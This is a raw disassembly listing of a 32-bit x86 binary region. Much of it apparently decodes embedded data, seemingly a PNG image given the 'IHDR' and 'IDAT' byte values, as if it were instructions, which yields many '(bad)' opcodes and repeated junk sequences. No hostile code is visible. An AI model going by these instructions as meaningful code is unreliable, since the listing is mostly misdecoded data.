  406ea3:	push   ds
  406ea4:	and    ebx,DWORD PTR [edx]
  406ea6:	dec    esi
  406ea7:	ds cmp eax,0x40543530
  406ead:	sbb    al,0x9
  406eaf:	push   esi
  406eb0:	pop    ecx
  406eb1:	pop    ebx
  406eb2:	cmp    esp,DWORD PTR [edx]
  406eb4:	sub    BYTE PTR [eax],ah
  406eb6:	dec    esi
  406eb7:	ds inc eax
  406eb9:	add    DWORD PTR [edx],eax
  406ebb:	push   esp
  406ebc:	ds sbb eax,0x34145221
  406ec2:	pop    ebx
  406ec3:	sub    al,0x2c
  406ec5:	sub    DWORD PTR [esi+0x40],ecx
  406ec8:	push   esi
  406ec9:	inc    esi
  406eca:	push   esp
  406ecb:	push   esp
  406ecc:	or     dl,BYTE PTR ds:[eax]
  406ecf:	adc    al,0x16
  406ed1:	and    al,0x48
  406ed3:	push   esi
  406ed4:	es and eax,0x404e
  406eda:	add    BYTE PTR [esi+edi*1+0x10],dl
  406ede:	adc    bl,BYTE PTR [ebx]
  406ee0:	push   ss
  406ee1:	cs sub eax,0x4e264958
  406ee7:	inc    esp
  406ee8:	add    BYTE PTR [eax],al
  406eea:	add    BYTE PTR [esi+edi*1+0xd],dl
  406eee:	push   cs
  406eef:	adc    eax,0x33332718
  406ef4:	xor    DWORD PTR [edx],ebp
  406ef6:	dec    esi
  406ef7:	inc    esp
  406ef8:	add    BYTE PTR [eax],al
  406efa:	add    BYTE PTR [esi+edi*1+0x3e],dl
  406efe:	ds ds aas 
  406f01:	inc    eax
  406f02:	inc    esp
  406f03:	inc    esp
  406f04:	inc    esp
  406f05:	inc    esi
  406f06:	dec    esi
  406f07:	inc    esp
  406f08:	add    BYTE PTR [eax],al
  406f0a:	add    BYTE PTR [eax+0x54],bl
  406f0d:	push   esp
  406f0e:	push   esp
  406f0f:	push   esp
  406f10:	push   esp
  406f11:	push   esp
  406f12:	dec    esi
  406f13:	dec    esi
  406f14:	push   ebx
  406f15:	dec    esi
  406f16:	dec    esi
  406f17:	push   esi
	...
  406f28:	(bad)  
  406f29:	inc    DWORD PTR [eax]
  406f2b:	add    BYTE PTR [edi+eax*1],bl
  406f2e:	add    BYTE PTR [eax],al
  406f30:	sbb    al,0xf
  406f32:	add    BYTE PTR [eax],al
  406f34:	pop    ds
  406f35:	pop    ds
	...
  406f52:	add    BYTE PTR [eax],al
  406f54:	loopne 0x406f56
  406f56:	add    BYTE PTR [eax],al
  406f58:	loopne 0x406f5a
  406f5a:	add    BYTE PTR [eax],al
  406f5c:	loopne 0x406f5e
  406f5e:	add    BYTE PTR [eax],al
  406f60:	loopne 0x406f62
  406f62:	add    BYTE PTR [eax],al
  406f64:	(bad)  
  406f65:	inc    DWORD PTR [eax]
  406f67:	add    BYTE PTR [ecx+0xd474e50],cl
  406f6d:	or     bl,BYTE PTR [edx]
  406f6f:	or     al,BYTE PTR [eax]
  406f71:	add    BYTE PTR [eax],al
  406f73:	or     eax,0x52444849
  406f78:	add    BYTE PTR [eax],al
  406f7a:	add    DWORD PTR [eax],eax
  406f7c:	add    BYTE PTR [eax],al
  406f7e:	add    DWORD PTR [eax],eax
  406f80:	or     BYTE PTR [esi],al
  406f82:	add    BYTE PTR [eax],al
  406f84:	add    BYTE PTR [edx+esi*2-0x58],bl
  406f88:	data16 add BYTE PTR [eax],al
  406f8b:	and    BYTE PTR [eax],al
  406f8d:	dec    ecx
  406f8e:	inc    esp
  406f8f:	inc    ecx
  406f90:	push   esp
  406f91:	js     0x406f2f
  406f93:	in     al,dx
  406f94:	mov    ebp,0xc92cb059
  406f99:	jns    0x406f7a
  406f9b:	test   ebx,0x4fdeaacc
  406fa1:	neg    DWORD PTR [ecx-0x12]
  406fa4:	cmp    eax,DWORD PTR ds:[esi]
  406fa7:	sbb    DWORD PTR [ecx],0x0
  406faa:	add    al,0x41
  406fac:	pusha  
  406fad:	inc    eax
  406fae:	pop    eax
  406faf:	add    BYTE PTR [edi],dl
  406fb1:	or     DWORD PTR [eax],edx
  406fb3:	add    DWORD PTR [ecx-0x29a4daec],ecx
  406fb9:	sbb    dl,BYTE PTR [esi+0x3f2ae0ed]
  406fbf:	(bad)  
  406fc1:	mov    ebx,0x41ea37ad
  406fc6:	and    DWORD PTR ds:0xd17a1c38,edi
  406fcc:	add    esp,DWORD PTR ds:0x8a1c9f87
  406fd2:	mov    al,0xb5
  406fd4:	adc    dh,BYTE PTR [ecx+eax*1]
  406fd7:	adc    ah,BYTE PTR [eax]
  406fd9:	or     BYTE PTR [edx+0x20067018],al
  406fdf:	data16 add BYTE PTR [ecx],0x6
  406fe3:	mov    bl,0xdf
  406fe5:	mov    ecx,0x3e967afb
  406fea:	mov    ebp,0x7e9992d4
  406fef:	enter  0xeacc,0xac
  406ff3:	jmp    0x773:0x33def73e
  406ffa:	or     edx,ebp
  406ffc:	pop    edi
  406ffd:	inc    esp
  406ffe:	lahf   
  406fff:	rcr    DWORD PTR [ebp-0x6b],cl
  407002:	mov    ch,0x65
  407004:	in     eax,0xf7
  407006:	iret   
  407007:	push   DWORD PTR [edi+0x65ac2664]
  40700d:	sub    eax,0x5acb596b
  407012:	(bad)  
  407013:	mov    dl,0x96
  407015:	mov    ch,0xac
  407017:	gs sub eax,0x5acb596b
  40701d:	(bad)  
  40701e:	mov    dl,0x96
  407020:	mov    ch,0xac
  407022:	gs sub eax,0x5acb596b
  407028:	(bad)  
  407029:	mov    dl,0x96
  40702b:	mov    ch,0xac
  40702d:	gs sub eax,0x5acb596b
  407033:	(bad)  
  407034:	mov    dl,0x96
  407036:	mov    ch,0xac
  407038:	gs sub eax,0x5acb596b
  40703e:	(bad)  
  40703f:	mov    dl,0x96
  407041:	mov    ch,0xac
  407043:	gs sub eax,0x5acb596b
  407049:	(bad)  
  40704a:	mov    dl,0x96
  40704c:	mov    ch,0xac
  40704e:	gs sub eax,0x5acb596b
  407054:	(bad)  
  407055:	mov    dl,0x96
  407057:	mov    ch,0xac
  407059:	gs sub eax,0x5acb596b
  40705f:	(bad)  
  407060:	mov    dl,0x96
  407062:	mov    ch,0xac
  407064:	gs sub eax,0x5acb596b
  40706a:	(bad)  
  40706b:	mov    dl,0x96
  40706d:	mov    ch,0xac
  40706f:	gs sub eax,0x5acb596b
  407075:	(bad)  
  407076:	mov    dl,0x96
  407078:	mov    ch,0xac
  40707a:	gs sub eax,0x5acb596b
  407080:	(bad)  
  407081:	mov    dl,0x96
  407083:	mov    ch,0xac
  407085:	gs sub eax,0x5acb596b
  40708b:	(bad)  
  40708c:	mov    dl,0x96
  40708e:	mov    ch,0xac
  407090:	gs sub eax,0x5acb596b
  407096:	(bad)  
  407097:	mov    dl,0x96
  407099:	mov    ch,0xac
  40709b:	gs sub eax,0x5acb596b
  4070a1:	(bad)  
  4070a2:	mov    dl,0x96
  4070a4:	mov    ch,0xac
  4070a6:	gs sub eax,0x5acb596b
  4070ac:	(bad)  
  4070ad:	mov    dl,0x96
  4070af:	mov    ch,0xac
  4070b1:	gs sub eax,0x5acb596b
  4070b7:	(bad)  
  4070b8:	mov    dl,0x96
  4070ba:	mov    ch,0xac
  4070bc:	gs sub eax,0xc452396b
  4070c2:	psubq  mm0,QWORD PTR [esi]
  4070c5:	jle    0x4070e3
  4070c7:	in     eax,0x7f
  4070c9:	jmp    DWORD PTR [edi-0x1]
  4070cc:	lods   al,BYTE PTR ds:[esi]
  4070cd:	mov    edi,0x3ea5b5b5
  4070d2:	cld    
  4070d3:	hlt    
  4070d4:	sar    DWORD PTR [esp+esi*8],cl
  4070d7:	enter  0x7923,0xb7
  4070db:	xlat   BYTE PTR ds:[ebx]
  4070dc:	xor    edi,DWORD PTR [ebp+0x61ff2f5e]
  4070e2:	(bad)  
  4070e4:	pop    edx
  4070e5:	(bad)  
  4070e6:	jb     0x407144
  4070e8:	pop    ecx
  4070e9:	add    eax,eax
  4070eb:	xor    ebp,esp
  4070ed:	repz mov edi,0xd5a27bf7
  4070f3:	push   0xfffffffd
  4070f5:	mov    ss,WORD PTR [eax]
  4070f7:	loop   0x40715c
  4070f9:	(bad)  
  4070fa:	fimul  DWORD PTR [ebx+0x42]
  4070fd:	mov    bl,cl
  4070ff:	mov    bl,0xc9
  407101:	in     al,0x5a
  407103:	pop    ecx
  407104:	adc    al,0x37
  407106:	rcl    DWORD PTR [esi-0x15],cl
  407109:	bound  ebx,QWORD PTR [edx-0xc8420dc]
  40710f:	cmc    
  407110:	xlat   BYTE PTR ds:[ebx]
  407111:	pop    edi
  407112:	mov    esi,0x18c2e17c
  407117:	cwde   
  407118:	std    
  407119:	outs   dx,DWORD PTR ds:[esi]
  40711a:	push   esp
  40711c:	lahf   
  40711d:	into   
  40711e:	jle    0x4070f8
  407120:	idiv   DWORD PTR [esi+edx*4+0x6b251cb5]
  407127:	add    BYTE PTR [eax],bh
  407129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40712a:	cld    
  40712b:	rcr    DWORD PTR [edi],0xfc
  40712e:	inc    ecx
  40712f:	push   edi
  407130:	dec    ecx
  407131:	stc    
  407132:	jge    0x407155
  407134:	les    eax,FWORD PTR [ebx+0x2a]
  407137:	dec    ebp
  407138:	push   ecx
  407139:	adc    BYTE PTR [eax+0xa],0x21
  40713d:	add    al,0xd6
  40713f:	pop    edx
  407140:	retf   0xc8a2
  407143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407144:	xchg   ebx,eax
  407145:	dec    ecx
  407146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407147:	mov    ch,0xbe
  407149:	outs   dx,BYTE PTR ds:[esi]
  40714a:	mov    WORD PTR [ecx+0x7d],?
  40714d:	ss popf 
  40714f:	mov    esi,0xbfdfde35
  407154:	outs   dx,BYTE PTR ds:[esi]
  407155:	lods   eax,DWORD PTR ds:[esi]
  407156:	mov    ebp,0x79798c68
  40715b:	mov    esp,0x70e17fbf
  407160:	cmp    al,0xbe
  407162:	and    eax,0xafff1885
  407167:	mov    edi,0xfd95bf5
  40716c:	sti    
  40716d:	jns    0x407145
  40716f:	repnz pop edi
  407171:	mov    dh,0xac
  407173:	add    eax,esp
  407175:	cwde   
  407176:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407178:	das    
  407179:	jge    0x407164
  40717b:	xor    al,0xf0
  40717d:	sub    dh,BYTE PTR [eax]
  40717f:	dec    eax
  407180:	xchg   ebx,eax
  407181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407182:	mov    esi,0x594c0853
  407187:	xchg   edx,eax
  407188:	out    0x39,eax
  40718a:	push   ss
  40718b:	adc    BYTE PTR [edx+0x20],al
  40718e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40718f:	inc    esp
  407190:	sub    ebp,esp
  407192:	jbe    0x407117
  407194:	sub    ebx,ecx
  407196:	xor    dl,bl
  407198:	pop    edx
  407199:	out    dx,eax
  40719a:	add    DWORD PTR [edi+0x77b8b80b],ebp
  4071a0:	sti    
  4071a1:	test   ch,0xc9
  4071a4:	loope  0x407187
  4071a6:	sub    eax,0x70c6d6e0
  4071ab:	js     0x40721d
  4071ad:	repz cli 
  4071af:	cmc    
  4071b0:	sbb    ecx,0x74
  4071b3:	mov    edx,0x8fa3e0fb
  4071b8:	out    dx,al
  4071b9:	in     eax,dx
  4071ba:	pushf  
  4071bb:	cmp    al,0x39
  4071bd:	(bad)  
  4071be:	out    0xd7,al
  4071c0:	mov    esi,0x93fa7e36
  4071c5:	lahf   
  4071c6:	pushf  
  4071c7:	cld    
  4071c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c9:	dec    edi
  4071ca:	jge    0x407176
  4071cc:	cld    
  4071cd:	sar    DWORD PTR [esi],0xe9
  4071d0:	pop    edx
  4071d1:	dec    BYTE PTR [ebx-0x70]
  4071d4:	xor    eax,0xfe531c00
  4071d9:	loopne 0x4071e6
  4071db:	pop    edi
  4071dc:	clc    
  4071dd:	dec    ecx
  4071de:	test   eax,0x2b40b3d4
  4071e3:	dec    ebp
  4071e4:	push   ebx
  4071e5:	mov    bh,0xd1
  4071e7:	pop    edx
  4071e8:	lods   al,BYTE PTR ds:[esi]
  4071e9:	jo     0x407240
  4071eb:	test   eax,0xcb2c92cb
  4071f0:	mov    al,0xd6
  4071f2:	and    al,BYTE PTR [ebp+0x85dbf00]
  4071f8:	adc    DWORD PTR [edx+edx*1+0x28024084],0x25021485
  407203:	and    eax,0x4210492a
  407208:	push   eax
  407209:	push   0xffffff8d
  40720b:	aad    0x1a
  40720d:	sub    DWORD PTR [ebp+0x5ac28846],esp
  407213:	pop    ebx
  407214:	push   0xffffffad
  407216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407217:	dec    ecx
  407218:	xchg   edx,eax
  407219:	mov    esp,0x34bca521
  40721e:	lahf   
  40721f:	dec    esi
  407220:	das    
  407221:	into   
  407222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407223:	rcl    edi,cl
  407225:	mov    bh,0x4f
  407227:	sahf   
  407228:	cmp    al,0xf
  40722a:	pop    esp
  40722b:	jge    0x407220
  40722d:	aad    0x57
  40722f:	fistp  QWORD PTR [edx]
  407231:	jno    0x40722d
  407233:	hlt    
  407234:	in     eax,dx
  407235:	pop    edi
  407236:	clc    
  407237:	int3   
  407238:	addr16 out 0x3f,al
  40723b:	mov    WORD PTR [edx-0x407034a8],?
  407241:	lods   al,BYTE PTR ds:[esi]
  407242:	add    eax,esp
  407244:	cwde   
  407245:	repnz stc 
  407247:	das    
  407248:	jl     0x40722b
  40724a:	out    0x12,eax
  40724c:	sub    edi,edi
  40724e:	adc    BYTE PTR [ecx],ah
  407250:	fs retf 
  407252:	add    eax,DWORD PTR [eax+0x7917f68d]
  407258:	dec    esi
  407259:	xchg   ecx,eax
  40725a:	out    0x58,eax
  40725c:	jmp    0x407214
  40725e:	or     ch,BYTE PTR [ecx]
  407260:	adc    DWORD PTR [esi],ebx
  407262:	add    al,0xa4
  407264:	adc    BYTE PTR [eax],ah
  407266:	and    eax,0x7ef15f02
  40726b:	pop    edi
  40726c:	add    BYTE PTR [edx],cl
  40726e:	adc    esi,edi
  407270:	sti    
  407271:	std    
  407272:	popa   
  407273:	lahf   
  407274:	add    DWORD PTR [edi+ebp*1-0x69acffd5],esp
  40727b:	and    BYTE PTR [esi+ebp*1+0x2108998d],al
  407282:	sub    DWORD PTR cs:[ecx],esp
  407285:	scas   al,BYTE PTR es:[edi]
  407286:	sbb    BYTE PTR [eax+0x1afb580],bh
  40728c:	pop    ss
  40728d:	xchg   ebp,eax
  40728e:	adc    BYTE PTR [edi-0x7b],dl
  407291:	xchg   esp,eax
  407292:	scas   eax,DWORD PTR es:[edi]
  407293:	sbb    ah,BYTE PTR [ebx-0x52]
  407296:	or     ch,BYTE PTR [ecx]
  407298:	addr16 jg 0x40727c
  40729b:	adc    ebx,DWORD PTR [edi-0x4a784ca8]
  4072a1:	lods   al,BYTE PTR ds:[esi]
  4072a2:	xchg   esp,eax
  4072a3:	in     al,0xee
  4072a5:	inc    ebp
  4072a6:	(bad)  
  4072a7:	adc    cl,BYTE PTR [ebx-0x5e]
  4072aa:	aam    0xc8
  4072ac:	sbb    ah,BYTE PTR [ebx]
  4072ae:	in     eax,0x8a
  4072b0:	jge    0x4072b4
  4072b2:	xor    dh,al
  4072b4:	pusha  
  4072b5:	ins    BYTE PTR es:[edi],dx
  4072b6:	add    al,0x9
  4072b8:	(bad)  
  4072b9:	cmp    BYTE PTR [esi],dl
  4072bb:	and    BYTE PTR ds:0x31a45ac6,ah
  4072c1:	pop    eax
  4072c2:	jg     0x407278
  4072c4:	lock int3 
  4072c6:	rcr    DWORD PTR [edx-0x75],0xc0
  4072ca:	add    DWORD PTR [ecx-0x8],ecx
  4072cd:	outs   dx,DWORD PTR ds:[esi]
  4072ce:	mov    eax,ds:0xa98c2cce
  4072d3:	add    ah,0x9f
  4072d6:	pop    ebp
  4072d7:	and    eax,0xc6343249
  4072dc:	or     al,0x8d
  4072de:	mov    ch,0xef
  4072e0:	seta   BYTE PTR [ebx-0x3dd296c0]
  4072e7:	cwde   
  4072e8:	cdq    
  4072e9:	test   BYTE PTR [ebp+0x6b],bh
  4072ec:	int3   
  4072ed:	test   DWORD PTR [edi+0x15ccf33f],ebp
  4072f3:	and    ebp,esp
  4072f5:	test   DWORD PTR [ebp-0xd6fa84b],0x4dea52b2
  4072ff:	imul   ebp,ebp,0x2b
  407302:	inc    eax
  407303:	test   BYTE PTR cs:[eax],ch
  407306:	test   DWORD PTR [eax],edx
  407308:	lds    eax,FWORD PTR [edi+0x3e]
  40730b:	repnz adc DWORD PTR [ebp+0x5f],edi
  40730f:	sub    ebp,DWORD PTR [edx+0x2d]
  407312:	aas    
  407313:	push   ss
  407314:	mov    dl,0x6
  407316:	and    BYTE PTR [ebx-0x76],0xd1
  40731a:	cli    
  40731b:	test   BYTE PTR [eax],cl
  40731d:	mov    ebp,0xad695e35
  407322:	lods   eax,DWORD PTR ds:[esi]
  407323:	xchg   esp,eax
  407324:	push   esi
  407325:	or     BYTE PTR [ecx+0x2b],al
  407328:	dec    ebp
  407329:	adc    DWORD PTR [edx+0x60],eax
  40732c:	lods   al,BYTE PTR ds:[esi]
  40732d:	lds    ebx,FWORD PTR [edx]
  40732f:	jecxz  0x407309
  407331:	xor    BYTE PTR [ebp-0x4d62d6f8],0x1b
  407338:	add    edx,DWORD PTR [edx-0x7e]
  40733b:	mov    ch,0xa0
  40733d:	xor    eax,0x16674a46
  407342:	pop    eax
  407343:	pop    ebx
  407344:	arpl   WORD PTR [edx],ax
  407346:	add    BYTE PTR [esi-0x294cb2fb],al
  40734c:	push   esi
  40734d:	xlat   BYTE PTR ds:[ebx]
  40734e:	lds    ebx,FWORD PTR [eax]
  407350:	mov    ah,0x31
  407352:	aad    0x3d
  407354:	inc    eax
  407355:	popf   
  407356:	into   
  407357:	pop    ecx
  407358:	imul   edi,DWORD PTR [ebx+0x7108ba06],0xffffffc6
  40735f:	xchg   esp,eax
  407360:	lds    edi,FWORD PTR gs:[esi]
  407363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407364:	xor    DWORD PTR [eax+0x63],ebx
  407367:	dec    edx
  407368:	and    ebp,esp
  40736a:	inc    esp
  40736b:	ret    0x95a1
  40736e:	jb     0x40737c
  407370:	in     al,dx
  407371:	jle    0x407366
  407373:	(bad)  
  407376:	pop    es
  407377:	mov    BYTE PTR [edx-0x78],0x3d
  40737b:	and    esp,eax
  40737d:	ins    DWORD PTR es:[edi],dx
  40737e:	pusha  
  40737f:	(bad)  
  407381:	or     bh,BYTE PTR [edx+eiz*1-0x27ec877c]
  407388:	pop    es
  407389:	popw   ds
  40738b:	(bad)  
  40738c:	lock xchg edi,edx
  40738f:	inc    eax
  407390:	icebp  
  407391:	out    0x48,eax
  407393:	(bad)  
  407394:	add    BYTE PTR [eax+0x4c],dh
  407397:	xor    esi,eax
  407399:	ins    BYTE PTR es:[edi],dx
  40739a:	add    DWORD PTR [ebx+ecx*1],esp
  40739d:	(bad)  
  40739e:	push   ds
  40739f:	or     BYTE PTR [ecx-0x59],al
  4073a2:	fucom  st(6)
  4073a4:	lea    esi,[edi]
  4073a6:	(bad)  
  4073a8:	(bad)  
  4073a9:	mov    edi,0xddba45f2
  4073ae:	xchg   esp,eax
  4073af:	loope  0x407421
  4073b1:	xchg   ebx,eax
  4073b2:	lods   eax,DWORD PTR ds:[esi]
  4073b3:	lods   eax,DWORD PTR ds:[esi]
  4073b4:	sbb    eax,0xfa4dc346
  4073b9:	or     DWORD PTR ds:0x2d16ad5a,0xffffffd5
  4073c0:	es ins DWORD PTR es:[edi],dx
  4073c2:	mov    ch,0x2b
  4073c4:	pop    edx
  4073c5:	(bad)  
  4073c6:	mov    ch,0x60
  4073c8:	mov    WORD PTR [ebx+0x1],fs
  4073cb:	inc    edx
  4073cc:	mov    eax,0xa45adf1e
  4073d1:	pop    es
  4073d2:	or     eax,DWORD PTR [edx-0x67]
  4073d5:	add    BYTE PTR [eax],cl
  4073d7:	jle    0x407458
  4073d9:	adc    bl,ch
  4073db:	scas   eax,DWORD PTR es:[edi]
  4073dc:	sub    eax,0x20c0b97c
  4073e1:	loop   0x4073e0
  4073e3:	and    al,BYTE PTR [edx]
  4073e5:	adc    cl,BYTE PTR [ecx+ecx*1+0x66304de7]
  4073ec:	test   DWORD PTR fs:[eax],ebx
  4073ef:	(bad)
  4073f2:	sub    edi,DWORD PTR [ecx+0xd]
  4073f5:	sbb    bl,BYTE PTR [eax-0x31fff1f]
  4073fb:	repz iret 
  4073fd:	aas    
  4073fe:	call   FWORD PTR [edx+0xe22e210]
  407404:	sbb    al,0x5e
  407406:	add    ebx,esi
  407408:	adc    al,0x42
  40740a:	pop    esp
  40740b:	push   es
  40740c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40740d:	pop    ds
  40740e:	cli    
  40740f:	rol    BYTE PTR [edi+0x1f8d51d6],1
  407415:	xor    ebx,DWORD PTR [ecx+0x3]
  407418:	shl    BYTE PTR [ecx],0x45
  40741b:	sub    DWORD PTR [ebp-0x1abae9a3],esi
  407421:	rol    bl,1
  407423:	test   edx,0xc1ca56ad
  407429:	rcr    DWORD PTR [eax+0x5df9f4ff],0xa6
  407430:	xor    eax,DWORD PTR [ebp-0x51]
  407433:	jae    0x4073be
  407435:	rol    DWORD PTR [esi+0x46],1
  407438:	mov    edi,0xb69d05b
  40743d:	dec    esi
  40743e:	in     al,dx
  40743f:	or     al,0xd9
  407441:	(bad)  
  407443:	pusha  
  407444:	jae    0x40741a
  407446:	cmp    BYTE PTR [si],bl
  407449:	mov    dl,0xbd
  40744b:	jge    0x4073cf
  40744d:	shr    DWORD PTR [eax-0x6d],1
  407450:	lea    ecx,[ebp-0x68b162df]
  407456:	and    al,0x6d
  407458:	xchg   ecx,eax
  407459:	mov    ah,0x5a
  40745b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40745c:	dec    ecx
  40745d:	mov    dh,BYTE PTR [ecx+0x7057ac06]
  407463:	add    ebx,DWORD PTR [eax-0x15]
  407466:	(bad)  
  407467:	loope  0x4074c1
  407469:	inc    eax
  40746a:	in     al,dx
  40746b:	jae    0x407475
  40746d:	xlat   BYTE PTR ds:[ebx]
  40746e:	scas   eax,DWORD PTR es:[edi]
  40746f:	jle    0x407433
  407471:	add    dl,BYTE PTR [esp+edi*8]
  407474:	jle    0x407427
  407476:	inc    edx
  407477:	mov    cl,0x2b
  407479:	(bad)  
  40747a:	mov    dl,0xe2
  40747c:	sbb    DWORD PTR [ebx+0x4c],ebp
  40747f:	add    edx,DWORD PTR [ebp+esi*4+0x18842076]
  407486:	add    BYTE PTR [edi],cl
  407488:	add    BYTE PTR [edi-0x7f30eb94],bl
  40748e:	cmp    DWORD PTR [eax-0x17],esi
  407491:	fcmovnu st,st(7)
  407493:	(bad)  
  407494:	imul   BYTE PTR [ebx-0x3bdeda40]
  40749a:	adc    eax,0x22e015e0
  40749f:	jo     0x4074f2
  4074a1:	or     BYTE PTR [ecx+0x13],dh
  4074a4:	cwde   
  4074a5:	jl     0x407497
  4074a7:	sbb    DWORD PTR [edi],0xffffffb4
  4074aa:	lods   al,BYTE PTR ds:[esi]
  4074ab:	in     eax,0x47
  4074ad:	dec    edx
  4074ae:	(bad)  
  4074af:	add    BYTE PTR [eax+0x4c],dh
  4074b2:	mov    cl,0xc6
  4074b4:	mov    esp,0x1acf7c07
  4074b9:	jp     0x407522
  4074bb:	inc    eax
  4074bc:	and    bl,BYTE PTR [eax-0x10518d33]
  4074c2:	(bad)  
  4074c3:	adc    al,0xd3
  4074c5:	fnstcw WORD PTR [ecx]
  4074c7:	lods   al,BYTE PTR ds:[esi]
  4074c8:	sub    al,0xe0
  4074ca:	jp     0x407455
  4074cc:	adc    al,0x86
  4074ce:	inc    esp
  4074cf:	int    0x69
  4074d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074d2:	arpl   WORD PTR [edx-0x37],bx
  4074d5:	sbb    BYTE PTR [ebp+0x75c9a4a6],ah
  4074db:	cli    
  4074dc:	mov    ebp,0x86da74eb
  4074e1:	jbe    0x4074ee
  4074e3:	mov    dh,0xb7
  4074e5:	ficomp DWORD PTR [ecx+edi*1-0x548c982f]
  4074ec:	ret    
  4074ed:	jo     0x4074c7
  4074ef:	cmp    BYTE PTR gs:[eax-0x2f],ch
  4074f3:	jmp    0x40751b
  4074f5:	je     0x407531
  4074f7:	or     ebp,ebx
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	fwait
  4074fb:	outs   dx,BYTE PTR ds:[esi]
  4074fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074fd:	dec    edi
  4074fe:	fisubr DWORD PTR [edx-0x2d]
  407501:	push   0x75
  407503:	push   0x49243ab5
  407508:	dec    edx
  407509:	xchg   edx,eax
  40750a:	sub    BYTE PTR [esp+ecx*2+0x6b41cf9c],dl
  407511:	je     0x407513
  407513:	push   es
  407514:	fistp  WORD PTR [ebx+0x358166c7]
  40751a:	push   es
  40751b:	loope  0x407536
  40751d:	mov    ecx,DWORD PTR ds:0xe0a084be
  407523:	shl    DWORD PTR [ebx],1
  407525:	les    ecx,FWORD PTR [edx+0x3b8100df]
  40752b:	in     eax,dx
  40752c:	imul   ebx,DWORD PTR [ebx+0x6b],0xffffffdb
  407530:	inc    edx
  407531:	mov    BYTE PTR [ecx],dl
  407533:	lock add esi,0x3d82c37e
  40753a:	mov    esp,0x2f8be2f2
  40753f:	pop    esi
  407540:	push   es
  407541:	cs js  0x407584
  407544:	fadd   DWORD PTR [ebx]
  407546:	mov    al,0xbe
  407549:	adc    BYTE PTR [edx-0x29],ah
  40754c:	jg     0x40756d
  40754e:	add    edi,DWORD PTR [ebx+0x42]
  407551:	mov    cl,ch
  407553:	push   ebx
  407554:	dec    edi
  407555:	cmp    eax,0xfe5c76b5
  40755a:	add    BYTE PTR [ebp+ecx*1+0x0],ah
  40755e:	(bad)  
  40755f:	nop
  407560:	(bad)  
  407562:	popf   
  407563:	fild   QWORD PTR [ecx-0x6b]
  407566:	pop    edx
  407567:	jg     0x407519
  407569:	jmp    0xa14a:0x25b2bdfd
  407570:	lods   eax,DWORD PTR ds:[esi]
  407571:	out    0xd6,al
  407573:	lods   eax,DWORD PTR ds:[esi]
  407574:	sub    DWORD PTR [ebp-0x67],esp
  407577:	pusha  
  407578:	inc    ebp
  407579:	loope  0x4075e7
  40757b:	jl     0x4075b7
  40757d:	sbb    BYTE PTR [ebx+0x5c88f5c8],ch
  407583:	aas    
  407584:	sub    BYTE PTR [ebx-0x27e7fe92],0xc5
  40758b:	pop    ds
  40758c:	outs   dx,DWORD PTR ds:[esi]
  40758d:	inc    eax
  40758e:	sbb    BYTE PTR [eax],dh
  407590:	and    eax,0xf4d08050
  407595:	cmp    eax,DWORD PTR [edi+0x7487db74]
  40759b:	cmp    esi,DWORD PTR [ebx+0x7a]
  40759e:	popf   
  40759f:	cmp    ebx,eax
  4075a1:	fisub  WORD PTR [ecx]
  4075a3:	mov    ebp,0x276e8cf6
  4075a8:	jecxz  0x40758e
  4075aa:	dec    esi
  4075ab:	(bad)  
  4075ac:	popf   
  4075ad:	in     eax,dx
  4075ae:	add    DWORD PTR [ebx],ebx
  4075b0:	sbb    ebx,DWORD PTR ds:0xd83736b6
  4075b6:	(bad)  
  4075b8:	mov    ds:0xd8321fd7,al
  4075bd:	sbb    dl,dl
  4075bf:	in     eax,dx
  4075c0:	or     eax,0x548a5448
  4075c5:	mov    ah,BYTE PTR [ecx+esi*8]
  4075c8:	adc    DWORD PTR [edx],ecx
  4075ca:	arpl   WORD PTR [ecx+ebx*4+0x1a9efe01],bx
  4075d1:	retf   0x92cc
  4075d4:	out    dx,eax
  4075d5:	loopne 0x4075c4
  4075d7:	add    al,0x51
  4075da:	mov    edi,0xd6b7d025
  4075df:	test   BYTE PTR [ebp+0x2a8ee710],0x8b
  4075e6:	xor    esi,DWORD PTR [ebx]
  4075e8:	dec    edx
  4075e9:	call   FWORD PTR [ecx]
  4075eb:	add    esp,edi
  4075ed:	pop    edi
  4075ee:	jp     0x4075d9
  4075f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075f1:	stos   DWORD PTR es:[edi],eax
  4075f2:	rcr    BYTE PTR [ebx-0x4873b3d4],0x80
  4075f9:	aaa    
  4075fa:	add    BYTE PTR [ebx],0x21
  4075fd:	(bad)  
  4075fe:	cld    
  4075ff:	jge    0x4075f0
  407601:	jnp    0x4075e2
  407603:	call   0xc003:0x5907dc4d
  40760a:	xor    DWORD PTR [ebp+eiz*1+0x49],eax
  40760e:	xlat   BYTE PTR ds:[ebx]
  40760f:	push   0xfffffffd
  407611:	push   eax
  407612:	aad    0x78
  407614:	inc    ebx
  407615:	mov    WORD PTR [edi+0x29],ds
  407618:	mov    WORD PTR [esi],gs
  40761a:	mov    ecx,0x368c737e
  40761f:	fwait
  407620:	mov    esi,0x16e5074
  407625:	ret    0x2d7a
  407628:	mov    ebp,eax
  40762a:	mov    edx,0x122060f0
  40762f:	call   DWORD PTR [ecx-0x67dfebe0]
  407635:	xchg   esp,eax
  407636:	or     DWORD PTR [ebx-0x38273dbe],edx
  40763c:	add    al,0x64
  40763e:	xchg   BYTE PTR [eax+0x5272251a],dl
  407644:	xor    eax,0xd2ee9da1
  407649:	dec    esi
  40764a:	(bad)  
  40764b:	je     0x4076a7
  40764d:	xchg   DWORD PTR [ebx+edi*2],ecx
  407650:	mov    bh,0x18
  407652:	or     eax,0x737a0ce6
  407657:	jbe    0x40760f
